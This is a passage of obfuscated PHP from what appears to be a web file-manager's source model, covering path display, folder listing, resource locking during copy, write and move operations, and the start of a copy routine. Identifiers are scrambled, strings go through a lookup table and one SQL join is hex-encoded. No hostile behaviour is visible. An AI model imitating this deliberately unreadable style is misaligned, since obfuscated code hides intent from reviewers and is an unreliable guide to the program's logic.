(isset($òû â³Á[$ñ®ĞÏ«ë[$ï£øëéÕ[411]]])) { $ÇÚ·£Ş­ = $òû â³Á[$ñ®ĞÏ«ë[$ï£øëéÕ[411]]]; if (!is_array($ñ®ĞÏ«ë[$ï£øëéÕ[475]])) { $ñ®ĞÏ«ë[$ï£øëéÕ[475]] = array(); } $ñ®ĞÏ«ë[$ï£øëéÕ[475]][$ï£øëéÕ[525]] = $ÇÚ·£Ş­[$ï£øëéÕ[519]]; $ñ®ĞÏ«ë[$ï£øëéÕ[422]][$ï£øëéÕ[526]] = $ÇÚ·£Ş­; $ñ®ĞÏ«ë[$ï£øëéÕ[422]][$ï£øëéÕ[527]] = $ñ®ĞÏ«ë[$ï£øëéÕ[528]]; $ñ®ĞÏ«ë[$ï£øëéÕ[422]][$ï£øëéÕ[529]] = $ï£øëéÕ[88]; if ($ÇÚ·£Ş­[$ï£øëéÕ[463]] != $ïËîİÒ) { $ñ®ĞÏ«ë[$ï£øëéÕ[422]][$ï£øëéÕ[423]] = $ñ®ĞÏ«ë[$ï£øëéÕ[422]][$ï£øëéÕ[423]] & $ÇÚ·£Ş­[$ï£øëéÕ[422]][$ï£øëéÕ[422]]; } continue; } $ÍùäŒÚˆ = $this->parentLevelArray($ñ®ĞÏ«ë[$ï£øëéÕ[530]]); $‘Âğ‚¥¾ = array_reverse($ÍùäŒÚˆ); foreach ($‘Âğ‚¥¾ as $Åû­²¾ü => $³¾›Ë‰§) { if (!isset($òû â³Á[$³¾›Ë‰§])) { continue; } $ÇÚ·£Ş­ = $òû â³Á[$³¾›Ë‰§]; $ñ®ĞÏ«ë[$ï£øëéÕ[422]][$ï£øëéÕ[526]] = $ÇÚ·£Ş­; if ($ÇÚ·£Ş­[$ï£øëéÕ[463]] != $ïËîİÒ) { $ñ®ĞÏ«ë[$ï£øëéÕ[422]][$ï£øëéÕ[423]] = $ñ®ĞÏ«ë[$ï£øëéÕ[422]][$ï£øëéÕ[423]] & $ÇÚ·£Ş­[$ï£øëéÕ[422]][$ï£øëéÕ[422]]; } $öµ™é•Ó = $ï£øëéÕ[12]; $äóá‰Ÿ = count($ÍùäŒÚˆ) - $Åû­²¾ü; for ($Ë®õèâã = 0; $Ë®õèâã < $äóá‰Ÿ; $Ë®õèâã++) { if (!isset($ò‹¢Øˆè[$ÍùäŒÚˆ[$Ë®õèâã]])) { $öµ™é•Ó = $ï£øëéÕ[12]; break; } $öµ™é•Ó = $öµ™é•Ó . rtrim($ò‹¢Øˆè[$ÍùäŒÚˆ[$Ë®õèâã]], $ï£øëéÕ[8]) . $ï£øëéÕ[8]; } $ñ®ĞÏ«ë[$ï£øëéÕ[422]][$ï£øëéÕ[527]] = rtrim($öµ™é•Ó, $ï£øëéÕ[8]) . $ï£øëéÕ[8]; break; } } unset($ñ®ĞÏ«ë); } public function groupPathDisplay(&$¿ï‰¢È) { $±Ì•Ää‚ =& $_SERVER[ĞÆÏ¡Îª]; if ($¿ï‰¢È[$±Ì•Ää‚[420]] != self::TYPE_GROUP) { return; } $ÅìÆ´Ãš = Model($±Ì•Ää‚[531])->getInfo($¿ï‰¢È[$±Ì•Ää‚[514]]); $…ØóŞÊ = $this->parentLevelArray($ÅìÆ´Ãš[$±Ì•Ää‚[530]]); $ú°ó¹ÉÍ = $±Ì•Ää‚[12]; foreach ($…ØóŞÊ as $¾İ³ú…Ö) { $Åç’èï² = Model($±Ì•Ää‚[531])->getInfo($¾İ³ú…Ö); $ú°ó¹ÉÍ .= $Åç’èï²[$±Ì•Ää‚[86]][$±Ì•Ää‚[411]] . $±Ì•Ää‚[50]; } $¿ï‰¢È[$±Ì•Ää‚[532]] = $ÅìÆ´Ãš[$±Ì•Ää‚[441]]; $¿ï‰¢È[$±Ì•Ää‚[533]] = $ÅìÆ´Ãš[$±Ì•Ää‚[530]]; $¿ï‰¢È[$±Ì•Ää‚[534]] = $ÅìÆ´Ãš[$±Ì•Ää‚[535]]; $¿ï‰¢È[$±Ì•Ää‚[536]] = $ú°ó¹ÉÍ . $ÅìÆ´Ãš[$±Ì•Ää‚[86]][$±Ì•Ää‚[411]]; } protected function _listAppendPath(&$’¼™‡³, $Ó¼Ã“Á = false) { $ØüÆÌÚ =& $_SERVER[ĞÆÏ¡Îª]; static $Ï¥‚–× = array(); $®‘º“²ß = array(); $îÍİ«¿‹ = array(); if ($Ó¼Ã“Á) { return $Ï¥‚–×; } foreach ($’¼™‡³ as &$ìŒ©°) { $…Ä¢¬¨º = $ìŒ©°[$ØüÆÌÚ[411]]; if ($ìŒ©°[$ØüÆÌÚ[419]] == $ØüÆÌÚ[88] && $ìŒ©°[$ØüÆÌÚ[441]] != 0) { $Ï¥‚–×[$…Ä¢¬¨º] = $ìŒ©°[$ØüÆÌÚ[32]]; } if ($ìŒ©°[$ØüÆÌÚ[419]] == $ØüÆÌÚ[88] && $ìŒ©°[$ØüÆÌÚ[441]] == 0 && !isset($Ï¥‚–×[$…Ä¢¬¨º])) { $Ï¥‚–×[$…Ä¢¬¨º] = $this->_listAppendPathRoot($ìŒ©°, array()); } if (isset($îÍİ«¿‹[$ìŒ©°[$ØüÆÌÚ[530]]])) { continue; } $îÍİ«¿‹[$ìŒ©°[$ØüÆÌÚ[530]]] = !0; $£É¼şÏ = $this->parentLevelArray($ìŒ©°[$ØüÆÌÚ[530]]); foreach ($£É¼şÏ as $•‘†ÑÑÆ => $Ôù„ğœ) { if (isset($Ï¥‚–×[$Ôù„ğœ])) { continue; } if ($•‘†ÑÑÆ == 0) { $Ï¥‚–×[$Ôù„ğœ] = $this->_listAppendPathRoot($ìŒ©°, $£É¼şÏ); } if ($•‘†ÑÑÆ != 0) { $®‘º“²ß[] = $Ôù„ğœ; } } } unset($ìŒ©°); $®‘º“²ß = array_unique($®‘º“²ß); if (count($®‘º“²ß) > 0) { $±›ğ¾  = array($ØüÆÌÚ[426] => array($ØüÆÌÚ[427], $®‘º“²ß)); if (count($®‘º“²ß) == 1) { $ğÏãªÄ = $this->sourceInfo($®‘º“²ß[0]); $´”ÁÃÇ‰ = is_array($ğÏãªÄ) ? array($ğÏãªÄ) : !1; } else { $´”ÁÃÇ‰ = $this->field($ØüÆÌÚ[537])->where($±›ğ¾ )->select(); } if (!$´”ÁÃÇ‰) { $´”ÁÃÇ‰ = array(); } foreach ($´”ÁÃÇ‰ as $²Ã·¤ç) { $Ï¥‚–×[$²Ã·¤ç[$ØüÆÌÚ[411]]] = $²Ã·¤ç[$ØüÆÌÚ[32]]; } } $æ˜¯Ó‰ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ô˜Ú„ğË = array(); foreach ($’¼™‡³ as &$ìŒ©°) { $™š™œœƒ = $ìŒ©°[$ØüÆÌÚ[530]]; $ğ…Ëìäâ = $ØüÆÌÚ[12]; if (isset($ô˜Ú„ğË[$™š™œœƒ])) { $ğ…Ëìäâ = $ô˜Ú„ğË[$™š™œœƒ]; } else { $£É¼şÏ = $this->parentLevelArray($ìŒ©°[$ØüÆÌÚ[530]]); foreach ($£É¼şÏ as $•‘†ÑÑÆ => $Ôù„ğœ) { if (isset($Ï¥‚–×[$Ôù„ğœ])) { $ğ…Ëìäâ .= $Ï¥‚–×[$Ôù„ğœ] . $ØüÆÌÚ[8]; } } $ô˜Ú„ğË[$™š™œœƒ] = $ğ…Ëìäâ; } $ğ…Ëìäâ .= $ìŒ©°[$ØüÆÌÚ[32]]; if ($ìŒ©°[$ØüÆÌÚ[419]] == $ØüÆÌÚ[88]) { $ğ…Ëìäâ .= $ØüÆÌÚ[8]; } $ìŒ©°[$ØüÆÌÚ[528]] = str_replace($ØüÆÌÚ[538], $ØüÆÌÚ[8], $ğ…Ëìäâ); if ($ìŒ©°[$ØüÆÌÚ[441]] == $ØüÆÌÚ[197]) { $ìŒ©°[$ØüÆÌÚ[32]] = trim($Ï¥‚–×[$ìŒ©°[$ØüÆÌÚ[411]]], $ØüÆÌÚ[8]); $ìŒ©°[$ØüÆÌÚ[528]] = $ìŒ©°[$ØüÆÌÚ[32]] . $ØüÆÌÚ[8]; } if (intval($ìŒ©°[$ØüÆÌÚ[420]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($ìŒ©°, $£É¼şÏ, $æ˜¯Ó‰); } } unset($ìŒ©°); return $’¼™‡³; } private function _listAppendPathRecycle(&$öìÄ¿¤œ, $¾ßµ†é, $•¡ŒÌ) { $…¶ôİÄÑ =& $_SERVER[ĞÆÏ¡Îª]; if (!in_array($•¡ŒÌ, $¾ßµ†é) && $öìÄ¿¤œ[$…¶ôİÄÑ[411]] != $•¡ŒÌ) { return; } $¡æşë¬å = explode($…¶ôİÄÑ[8], trim($öìÄ¿¤œ[$…¶ôİÄÑ[528]], $…¶ôİÄÑ[8])); $ÖËÚ«‰î = implode($…¶ôİÄÑ[8], array_slice($¡æşë¬å, 2)); $öìÄ¿¤œ[$…¶ôİÄÑ[528]] = $…¶ôİÄÑ[8] . LNG($…¶ôİÄÑ[539]) . $…¶ôİÄÑ[8] . ltrim($ÖËÚ«‰î, $…¶ôİÄÑ[8]); $öìÄ¿¤œ[$…¶ôİÄÑ[530]] = $…¶ôİÄÑ[540] . implode($…¶ôİÄÑ[50], array_slice($¾ßµ†é, 1)) . $…¶ôİÄÑ[50]; if ($öìÄ¿¤œ[$…¶ôİÄÑ[411]] == $•¡ŒÌ) { $öìÄ¿¤œ[$…¶ôİÄÑ[530]] = $…¶ôİÄÑ[540]; $öìÄ¿¤œ[$…¶ôİÄÑ[441]] = $…¶ôİÄÑ[197]; $öìÄ¿¤œ[$…¶ôİÄÑ[32]] = LNG($…¶ôİÄÑ[539]); } $öìÄ¿¤œ[$…¶ôİÄÑ[541]] = $…¶ôİÄÑ[542]; } protected function _listAppendPathRoot(&$Òáî§Ø¢, $×­¹¬³) { $œúûğàŒ =& $_SERVER[ĞÆÏ¡Îª]; static $ƒ£Œæåø = false; $ê¶îìçú = $œúûğàŒ[12]; if ($Òáî§Ø¢[$œúûğàŒ[420]] == self::TYPE_USER) { if (defined($œúûğàŒ[484]) && $Òáî§Ø¢[$œúûğàŒ[514]] == USER_ID) { $ê¶îìçú = LNG($œúûğàŒ[543]); if ($ƒ£Œæåø === !1) { $ñ‰ˆğ¢› = Model($œúûğàŒ[544])->getInfoFull(USER_ID); $ƒ£Œæåø = _get($ñ‰ˆğ¢›, $œúûğàŒ[545], $œúûğàŒ[12]); } if ($×­¹¬³ && $×­¹¬³[0] == $ƒ£Œæåø || !$×­¹¬³ && $Òáî§Ø¢[$œúûğàŒ[411]] == $ƒ£Œæåø) { $ê¶îìçú = LNG($œúûğàŒ[546]); $Òáî§Ø¢[$œúûğàŒ[547]] = $œúûğàŒ[548]; } if (!$×­¹¬³) { $Òáî§Ø¢[$œúûğàŒ[32]] = $ê¶îìçú; } } else { $ã™¢‰ğ— = Model($œúûğàŒ[522])->getInfoSimple($Òáî§Ø¢[$œúûğàŒ[514]]); $ê¶îìçú = LNG($œúûğàŒ[549]) . $œúûğàŒ[162] . $ã™¢‰ğ—[$œúûğàŒ[32]] . $œúûğàŒ[164]; $Òáî§Ø¢[$œúûğàŒ[550]] = array($œúûğàŒ[32] => $ã™¢‰ğ—[$œúûğàŒ[32]], $œúûğàŒ[551] => $ã™¢‰ğ—[$œúûğàŒ[551]], $œúûğàŒ[552] => $ã™¢‰ğ—[$œúûğàŒ[552]]); } } else { if ($Òáî§Ø¢[$œúûğàŒ[420]] == self::TYPE_GROUP) { $ã™¢‰ğ— = Model($œúûğàŒ[531])->getInfoSimple($Òáî§Ø¢[$œúûğàŒ[514]]); $ê¶îìçú = $ã™¢‰ğ—[$œúûğàŒ[32]]; } else { if ($Òáî§Ø¢[$œúûğàŒ[420]] == self::TYPE_SYSTEM) { $ê¶îìçú = $œúûğàŒ[553]; } } } $ê¶îìçú = $ê¶îìçú ? $œúûğàŒ[8] . $ê¶îìçú . $œúûğàŒ[8] : $œúûğàŒ[8]; return $ê¶îìçú; } protected function _listAppendUser(&$ºâ÷çõ€) { $²ï¬Œçƒ =& $_SERVER[ĞÆÏ¡Îª]; $—ÏˆØèš = array_to_keyvalue($ºâ÷çõ€, $²ï¬Œçƒ[12], $²ï¬Œçƒ[463]); $—ÈÇºáÚ = array_to_keyvalue($ºâ÷çõ€, $²ï¬Œçƒ[12], $²ï¬Œçƒ[465]); $•ü÷ÁÑ = array_merge($—ÏˆØèš, $—ÈÇºáÚ); $¤•¸ŠĞÃ = Model($²ï¬Œçƒ[544])->userListInfo($•ü÷ÁÑ); foreach ($ºâ÷çõ€ as &$¯–Òß½Ş) { $ÊÀì¸Ä = $¯–Òß½Ş[$²ï¬Œçƒ[463]]; $¯–Òß½Ş[$²ï¬Œçƒ[463]] = $¤•¸ŠĞÃ[$ÊÀì¸Ä] ? $¤•¸ŠĞÃ[$ÊÀì¸Ä] : !1; $ÊÀì¸Ä = $¯–Òß½Ş[$²ï¬Œçƒ[465]]; $¯–Òß½Ş[$²ï¬Œçƒ[465]] = $¤•¸ŠĞÃ[$ÊÀì¸Ä] ? $¤•¸ŠĞÃ[$ÊÀì¸Ä] : !1; if (isset($¯–Òß½Ş[$²ï¬Œçƒ[475]]) && $¯–Òß½Ş[$²ï¬Œçƒ[475]][$²ï¬Œçƒ[554]]) { $ÛÇÙà¶ = $GLOBALS[$²ï¬Œçƒ[6]][$²ï¬Œçƒ[89]][$²ï¬Œçƒ[555]]; if ($¯–Òß½Ş[$²ï¬Œçƒ[475]][$²ï¬Œçƒ[556]] <= time() - $ÛÇÙà¶) { $this->metaSet($¯–Òß½Ş[$²ï¬Œçƒ[411]], $²ï¬Œçƒ[554], null); $this->metaSet($¯–Òß½Ş[$²ï¬Œçƒ[411]], $²ï¬Œçƒ[556], null); unset($¯–Òß½Ş[$²ï¬Œçƒ[475]][$²ï¬Œçƒ[554]]); continue; } $ÜÃ»úà = $¯–Òß½Ş[$²ï¬Œçƒ[475]][$²ï¬Œçƒ[554]]; $¯–Òß½Ş[$²ï¬Œçƒ[475]][$²ï¬Œçƒ[557]] = Model($²ï¬Œçƒ[544])->getInfoSimpleOuter($ÜÃ»úà); } } unset($¯–Òß½Ş); } public function parentLevelArray($½“Úë) { $¡ÑÓ‡³« =& $_SERVER[ĞÆÏ¡Îª]; $½“Úë = explode($¡ÑÓ‡³«[50], trim($½“Úë, $¡ÑÓ‡³«[50])); return array_remove_value($½“Úë, $¡ÑÓ‡³«[197]); } public function listAll($Ó’š×®£) { $êœÛ€œÉ =& $_SERVER[ĞÆÏ¡Îª]; $¥‹ó± ¸ = $this->sourceInfo($Ó’š×®£); $ñ¼¢ö–“ = array($êœÛ€œÉ[558] => array($êœÛ€œÉ[559], $¥‹ó± ¸[$êœÛ€œÉ[530]] . $Ó’š×®£ . $êœÛ€œÉ[560]), $êœÛ€œÉ[561] => 0); $ÜšÅ·†è = $êœÛ€œÉ[562]; $‡ü†—’† = "\x4c\105\106\x54\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\151\x6f\137\146\x69\154\x65\x20\x66\151\x6c\145\x20\157\156\40\x73\157\165\162\143\x65\x2e\146\x69\x6c\x65\111\x44\40\x3d\40\146\x69\154\145\56\146\151\x6c\145\x49\x44"; $ôç¹÷±Ï = $this->alias($êœÛ€œÉ[455])->field($ÜšÅ·†è)->where($ñ¼¢ö–“)->join($‡ü†—’†)->select(); $this->_listAppendAuth($ôç¹÷±Ï); $this->_listAppendUser($ôç¹÷±Ï); $this->_listAppendPath($ôç¹÷±Ï); $ôç¹÷±Ï = array_to_keyvalue($ôç¹÷±Ï, $êœÛ€œÉ[411]); $‰˜Œ×© = "\x2f{$¥‹ó± ¸[$êœÛ€œÉ[32]]}\57"; $‰˜Œ×© = $‰˜Œ×© == $êœÛ€œÉ[538] ? $êœÛ€œÉ[8] : $‰˜Œ×©; $—™¬æ¥Û = array(); foreach ($ôç¹÷±Ï as $½£Ó£­© => $ö–Ä•È™) { $í¸ı»åí = $this->parentLevelArray($ö–Ä•È™[$êœÛ€œÉ[530]]); array_shift($í¸ı»åí); $ÄÊ£÷ç = $‰˜Œ×©; for ($ıáµ¢¢† = 0; $ıáµ¢¢† < count($í¸ı»åí); $ıáµ¢¢†++) { $ÄÊ£÷ç .= $ôç¹÷±Ï[$í¸ı»åí[$ıáµ¢¢†]][$êœÛ€œÉ[32]] . $êœÛ€œÉ[8]; } $ÄÊ£÷ç .= $ö–Ä•È™[$êœÛ€œÉ[32]]; if ($ö–Ä•È™[$êœÛ€œÉ[419]]) { $ÄÊ£÷ç .= $êœÛ€œÉ[8]; } $ÄÊ£÷ç = str_replace($êœÛ€œÉ[538], $êœÛ€œÉ[8], $ÄÊ£÷ç); $ÄÊ£÷ç = str_replace($êœÛ€œÉ[538], $êœÛ€œÉ[8], $ÄÊ£÷ç); $”„‰€‘“ = array($êœÛ€œÉ[430] => str_replace($êœÛ€œÉ[538], $êœÛ€œÉ[8], $ÄÊ£÷ç), $êœÛ€œÉ[563] => intval($ö–Ä•È™[$êœÛ€œÉ[419]]), $êœÛ€œÉ[86] => $this->pathInfoFilter($ö–Ä•È™)); if (!$ö–Ä•È™[$êœÛ€œÉ[419]]) { $”„‰€‘“[$êœÛ€œÉ[477]] = $ö–Ä•È™[$êœÛ€œÉ[477]]; $”„‰€‘“[$êœÛ€œÉ[87]] = $ö–Ä•È™[$êœÛ€œÉ[84]]; } $—™¬æ¥Û[] = $”„‰€‘“; } return $—™¬æ¥Û; } } class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($ŠÆ¿È½õ) { $ƒĞ‚­´Î =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->allowLock()) { return; } $this->_lockCheck($ƒĞ‚­´Î[564], $ŠÆ¿È½õ); $…÷ô¤ø = 1; $this->_lockEvent($ŠÆ¿È½õ, array($ƒĞ‚­´Î[565], $ƒĞ‚­´Î[566]), $…÷ô¤ø); $this->_lockParent($ŠÆ¿È½õ, array($ƒĞ‚­´Î[566]), $…÷ô¤ø); $this->_lockEvent($ŠÆ¿È½õ, array($ƒĞ‚­´Î[567], $ƒĞ‚­´Î[568]), $…÷ô¤ø); $this->_lockCheckEnd($ƒĞ‚­´Î[564], $ŠÆ¿È½õ); } public function lockCopyEnd($öÙ‹ñÚ) { $Ã‰Ìô…‹ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->allowLock()) { return; } $š¸¿èÇƒ = 0; $this->_lockEvent($öÙ‹ñÚ, array($Ã‰Ìô…‹[565], $Ã‰Ìô…‹[566]), $š¸¿èÇƒ); $this->_lockParent($öÙ‹ñÚ, array($Ã‰Ìô…‹[566]), $š¸¿èÇƒ); $this->_lockEvent($öÙ‹ñÚ, array($Ã‰Ìô…‹[567], $Ã‰Ìô…‹[568]), $š¸¿èÇƒ); } public function lockWriteStart($ú‚÷§Îâ, $“Ò»¤ƒ = '') { $‹’çÓˆ¨ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->allowLock()) { return; } $this->_lockCheck($‹’çÓˆ¨[565], $ú‚÷§Îâ); $€ÁÆïÆä = 1; $this->_lockKey($‹’çÓˆ¨[569] . $ú‚÷§Îâ . $‹’çÓˆ¨[10] . $“Ò»¤ƒ, $€ÁÆïÆä); $this->_lockEvent($ú‚÷§Îâ, array($‹’çÓˆ¨[564], $‹’çÓˆ¨[566]), $€ÁÆïÆä); $this->_lockParent($ú‚÷§Îâ, array($‹’çÓˆ¨[564], $‹’çÓˆ¨[566]), $€ÁÆïÆä); $this->_lockCheckEnd($‹’çÓˆ¨[565], $ú‚÷§Îâ); } public function lockWriteEnd($æÅù›Ë, $“ñÏ÷‹¤ = '') { $šÕæì‹˜ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->allowLock()) { return; } $Åá†ùüš = 0; $this->_lockKey($šÕæì‹˜[569] . $æÅù›Ë . $šÕæì‹˜[10] . $“ñÏ÷‹¤, $Åá†ùüš); $this->_lockEvent($æÅù›Ë, array($šÕæì‹˜[564], $šÕæì‹˜[566]), $Åá†ùüš); $this->_lockParent($æÅù›Ë, array($šÕæì‹˜[564], $šÕæì‹˜[566]), $Åá†ùüš); } public function lockMoveStart($³·§œˆ’) { $ÖìÒ³ß =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->allowLock()) { return; } $this->_lockCheck($ÖìÒ³ß[566], $³·§œˆ’); $ïÀú’îƒ = 1; $this->_lockKey($ÖìÒ³ß[570] . $³·§œˆ’, $ïÀú’îƒ); $this->_lockEvent($³·§œˆ’, array($ÖìÒ³ß[564], $ÖìÒ³ß[565]), $ïÀú’îƒ); $this->_lockParent($³·§œˆ’, array($ÖìÒ³ß[564], $ÖìÒ³ß[566]), $ïÀú’îƒ); $this->_lockEvent($³·§œˆ’, array($ÖìÒ³ß[571], $ÖìÒ³ß[567], $ÖìÒ³ß[568]), $ïÀú’îƒ); $this->_lockCheckEnd($ÖìÒ³ß[566], $³·§œˆ’); } public function lockMoveEnd($ğ¯ùŒî) { $®Ä†‚™š =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->allowLock()) { return; } $àŒÑ¢Ã = 0; $this->_lockKey($®Ä†‚™š[570] . $ğ¯ùŒî, $àŒÑ¢Ã); $this->_lockEvent($ğ¯ùŒî, array($®Ä†‚™š[564], $®Ä†‚™š[565]), $àŒÑ¢Ã); $this->_lockParent($ğ¯ùŒî, array($®Ä†‚™š[564], $®Ä†‚™š[566]), $àŒÑ¢Ã); $this->_lockEvent($ğ¯ùŒî, array($®Ä†‚™š[571], $®Ä†‚™š[567], $®Ä†‚™š[568]), $àŒÑ¢Ã); } private function _lockCheck($Ç™Ì¥§Á, $Ù½Š¸¼) { $ä•àÜ±Ö =& $_SERVER[ĞÆÏ¡Îª]; $Â¦Ìİ©¡ = $this->sourceInfo($Ù½Š¸¼); $…¬şéŠæ = $Ç™Ì¥§Á . $ä•àÜ±Ö[10] . $Ù½Š¸¼; $this->_lockTimeStart[$…¬şéŠæ] = timeFloat(); if (!is_array($Â¦Ìİ©¡)) { return; } $§çå Ëå = LNG($ä•àÜ±Ö[572]); CacheLock::setErrorMsg($ä•àÜ±Ö[162] . htmlspecialchars($Â¦Ìİ©¡[$ä•àÜ±Ö[32]]) . $ä•àÜ±Ö[164] . $§çå Ëå); $this->_lockKey($…¬şéŠæ, 1); $this->_lockKey($…¬şéŠæ, 0); $‘Ößû“ş = array_reverse($this->parentLevelArray($Â¦Ìİ©¡[$ä•àÜ±Ö[530]])); foreach ($‘Ößû“ş as $İò¿¹şô) { $…¬şéŠæ = $Ç™Ì¥§Á . $ä•àÜ±Ö[573] . $İò¿¹şô; if (CacheLock::lockGet($ä•àÜ±Ö[574] . $…¬şéŠæ)) { $Â¦Ìİ©¡ = $this->sourceInfo($İò¿¹şô); CacheLock::setErrorMsg($ä•àÜ±Ö[162] . htmlspecialchars($Â¦Ìİ©¡[$ä•àÜ±Ö[32]]) . $ä•àÜ±Ö[164] . $§çå Ëå); $this->_lockKey($…¬şéŠæ, 1); $this->_lockKey($…¬şéŠæ, 0); } } } private function _lockCheckEnd($ì¡ËÏò×, $ÂÕ´²ˆÙ) { $Ÿ§®„õû =& $_SERVER[ĞÆÏ¡Îª]; $çûëî§õ = $ì¡ËÏò× . $Ÿ§®„õû[10] . $ÂÕ´²ˆÙ; CacheLock::setErrorMsg($Ÿ§®„õû[246]); if (!isset($this->_lockTimeStart[$çûëî§õ])) { return; } $¶Ã¦ÌÙÏ = timeFloat() - $this->_lockTimeStart[$çûëî§õ]; unset($this->_lockTimeStart[$çûëî§õ]); if ($¶Ã¦ÌÙÏ > 0.5) { unset(self::$cacheSourceInfo[$Ÿ§®„õû[469] . $ÂÕ´²ˆÙ]); } $Ã…ÛÖ“¦ = $this->sourceInfo($ÂÕ´²ˆÙ); if (!$Ã…ÛÖ“¦) { show_json(LNG($Ÿ§®„õû[105]), !1); } } private function _lockParent($ïü—´¸€, $Åì“ë, $†¼–÷úô) { if (!$this->autoLockSet) { return; } $áªä™ß = $this->sourceInfo($ïü—´¸€); if (!is_array($áªä™ß)) { return; } $èòÄóÄ = array_reverse($this->parentLevelArray($áªä™ß[$_SERVER[ĞÆÏ¡Îª][530]])); foreach ($èòÄóÄ as $¸¡‘¥) { $this->_lockEvent($¸¡‘¥, $Åì“ë, $†¼–÷úô); } } private function _lockEvent($¾üÅùÉ‰, $¸²€åÛ, $Ì¬Âí¡‹) { $ éáûÉ =& $_SERVER[ĞÆÏ¡Îª]; if (!$this->autoLockSet) { return; } foreach ($¸²€åÛ as $¬‹²«ÃÆ) { $èéñ†¯¡ = $¬‹²«ÃÆ . $ éáûÉ[10] . $¾üÅùÉ‰; if ($Ì¬Âí¡‹ && CacheLock::lockGet($ éáûÉ[574] . $èéñ†¯¡)) { continue; } $this->_lockKey($èéñ†¯¡, $Ì¬Âí¡‹); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($í“µü†«, $–ÏÜÎôş = 1) { $¶–ÖıÏŒ = $_SERVER[ĞÆÏ¡Îª][574] . md5($í“µü†«); if ($–ÏÜÎôş) { if (isset(self::$_lockItemArr[$¶–ÖıÏŒ])) { return; } self::$_lockItemArr[$¶–ÖıÏŒ] = 1; CacheLock::lock($¶–ÖıÏŒ, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$¶–ÖıÏŒ])) { return; } unset(self::$_lockItemArr[$¶–ÖıÏŒ]); CacheLock::unlock($¶–ÖıÏŒ); } } public function isParentOf($¡¹¸·ÛÛ, $—Úáˆî†) { $›ÜíÁ¸§ =& $_SERVER[ĞÆÏ¡Îª]; $ä…ÎŒıÜ = $this->sourceInfo($¡¹¸·ÛÛ); $°œÇ¬ş = $this->sourceInfo($—Úáˆî†); $¯í‹Å¹ = $ä…ÎŒıÜ[$›ÜíÁ¸§[530]] . $ä…ÎŒıÜ[$›ÜíÁ¸§[411]] . $›ÜíÁ¸§[50]; $Èİ®Àã× = $°œÇ¬ş[$›ÜíÁ¸§[530]] . $°œÇ¬ş[$›ÜíÁ¸§[411]] . $›ÜíÁ¸§[50]; $Ö±Â†ê› = strpos($Èİ®Àã×, $¯í‹Å¹) === 0; return $Ö±Â†ê›; } private $targetIsDelete = 0; public function copy($ûß‡»½, $‚Ò®º¶†, $Œ”îµòİ = REPEAT_REPLACE, $¿¾ø¤Ç… = '') { $÷ÉÓí¥º =& $_SERVER[ĞÆÏ¡Îª]; $ŞÁ©˜İõ = $this->sourceInfo($ûß‡»½); $£¡Ü„ÜØ = $this->sourceInfo($‚Ò®º¶†); if (!$ŞÁ©˜İõ || !$£¡Ü„ÜØ || $£¡Ü„ÜØ[$÷ÉÓí¥º[419]] != $÷ÉÓí¥º[88]) { return !1; } if ($this->isParentOf($ûß‡»½, $‚Ò®º¶†)) { return !1; } $œ––õõ = $¿¾ø¤Ç… ? $¿¾ø¤Ç… : $ŞÁ©˜İõ[$÷ÉÓí¥º[32]]; $this->lockCopyStart($ûß‡»½); $this->lockWriteStart($‚Ò®º¶†, $œ––õõ); $ƒòİœ¶Ø = array($÷ÉÓí¥º[575] => array(), $÷ÉÓí¥º[576] => array(), $÷ÉÓí¥º[577] => array()); $this->targetIsDelete = intval($ŞÁ©˜İõ[$÷ÉÓí¥º[440]]); $ˆÁç§¡µ = $this->fileNameExistCache($‚Ò®º¶†, $ŞÁ©˜İõ[$÷ÉÓí¥º[32]]); $½İ€Ó = $this->_copy($ûß‡»½, $‚Ò®º¶†, $Œ”îµòİ, $ƒòİœ¶Ø, !0, $¿¾ø¤Ç…); $this->_childrenListClear(); $this->lockCopyEnd($ûß‡»½); $this->lockWriteEnd($‚Ò®º¶†, $œ––õõ); if ($ŞÁ©˜İõ[$÷ÉÓí¥º[419]] == $÷ÉÓí¥º[88] && $ˆÁç§¡µ == $½İ€Ó) { $this->folderSizeResetChildren($ˆÁç§¡µ); } Model($÷ÉÓí¥º[578])->addAll($ƒòİœ¶Ø[$÷ÉÓí¥º[576]], array(), !0); if ($ˆÁç§¡µ != $½İ€Ó || $ŞÁ©˜İõ[$÷ÉÓí¥º[419]] == $÷ÉÓí¥º[88]) { Model($÷ÉÓí¥º[579])->eventCopy($½İ€Ó); } $this->saveAll($ƒòİœ¶Ø[$÷ÉÓí¥º[577]]); Model($÷ÉÓí¥º[199])->linkAdd($ƒòİœ¶Ø[$÷ÉÓí¥º[575]]); $this->folderSizeReset($‚Ò®º¶†); $this->updateModifyTime($‚Ò®º¶†); return $½İ€Ó; } private function _copy($õÇ”ÀğØ, $š¸—Ö¤Ö, $·®¹±û€, &$ÑıĞ¾¨, $è—®Şğ, $ëˆôÊø = '') { $³ñ·íÄ =& $_SERVER[ĞÆÏ¡Îª]; $Ğ›’Æ„ = $this->sourceInfoCache($õÇ”ÀğØ); $¼­Ùâ¥¯ = $Ğ›’Æ„[$³ñ·íÄ[419]] == $³ñ·íÄ[88]; $“°²ê³â = $ëˆôÊø ? $ëˆôÊø : $Ğ›’Æ„[$³ñ·íÄ[32]]; $‘éÎÍ = $this->fileNameExistCache($š¸—Ö¤Ö, $“°²ê³â); if ($è—®Şğ) { $this->_childrenAllMake($õÇ”ÀğØ); if ($¼­Ùâ¥¯ && $‘éÎÍ) { $this->_childrenAllMake($‘éÎÍ); } } if (!$‘éÎÍ) { return $this->_copyCreate($õÇ”ÀğØ, $š¸—Ö¤Ö, $“°²ê³â, $ÑıĞ¾¨); } $¢Û…Ÿ‹Ñ = $‘éÎÍ; if ($¼­Ùâ¥¯) { if ($·®¹±û€ == REPEAT_RENAME_FOLDER) { $“°²ê³â = $this->fileNameAutoCache($š¸—Ö¤Ö, $“°²ê³â, $·®¹±û€, 